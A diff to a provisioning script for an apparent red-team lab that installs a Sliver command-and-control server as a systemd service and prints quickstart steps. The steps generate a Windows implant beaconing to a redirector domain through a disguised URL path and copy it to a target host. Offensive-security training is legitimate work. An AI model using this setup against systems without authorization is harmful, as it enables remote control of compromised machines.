@@ -95,6 +95,19 @@ fi
 echo "[*] Verifying Sliver installation..."
 which sliver-server && echo "[+] Sliver server binary found at $(which sliver-server)" || echo "[!] WARNING: Sliver binary not in PATH"
 
+# Set UMask=0022 on Sliver service so generated implants are world-readable (no chmod needed)
+echo "[*] Configuring Sliver service umask..."
+mkdir -p /etc/systemd/system/sliver.service.d/
+cat > /etc/systemd/system/sliver.service.d/umask.conf << 'UMASKCONF'
+[Service]
+UMask=0022
+UMASKCONF
+
+# Ensure Sliver service is enabled and running
+echo "[*] Enabling and starting Sliver service..."
+systemctl daemon-reload
+systemctl enable sliver --now && echo "[+] Sliver service enabled and started" || echo "[!] WARNING: Could not start sliver service"
+
 # Create HTTP C2 profile with the redirector validation header pre-configured
 echo "[*] Creating redstack HTTP C2 profile..."
 jq -n \
@@ -152,23 +165,25 @@ cat > /root/sliver_quickstart.sh << 'QUICKSTART'
 #!/bin/bash
 echo "===== Sliver C2 Quick Start ====="
 echo ""
-echo "1. Start the Sliver server (if not running):"
-echo "   sudo systemctl start sliver"
+echo "The Sliver daemon runs as a systemd service and starts automatically on boot."
 echo ""
-echo "2. Open the Sliver console:"
-echo "   sliver-server"
+echo "1. Connect to the Sliver console:"
+echo "   sliver-client"
 echo ""
-echo "3. Generate an operator config:"
-echo "   sudo /root/generate_operator_config.sh operator1"
+echo "2. Import the redstack C2 profile (first time only):"
+echo "   c2profiles import --file /root/redstack-c2-profile.json --name redstack"
 echo ""
-echo "4. In the Sliver console, start an HTTP listener:"
+echo "3. Start an HTTP listener:"
 echo "   http --lhost 0.0.0.0 --lport 80"
 echo ""
-echo "5. Generate an implant:"
-echo "   generate --http https://REDIRECTOR_DOMAIN/images/ --os windows --arch amd64 --format exe --save /tmp/implant.exe"
+echo "4. Generate an implant:"
+echo "   generate --http https://REDIRECTOR_DOMAIN/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe"
 echo ""
-echo "Current status:"
-systemctl status sliver --no-pager 2>/dev/null || echo "Sliver service not found (may need manual start)"
+echo "5. Transfer to Windows (from PowerShell on WIN-OPERATOR):"
+echo "   scp admin@sliver:/tmp/implant.exe C:\Users\Administrator\Desktop\implant.exe"
+echo ""
+echo "Service status:"
+systemctl status sliver --no-pager 2>/dev/null || echo "Sliver service not found"
 echo ""
 echo "Multiplexer port: 31337"
 QUICKSTART
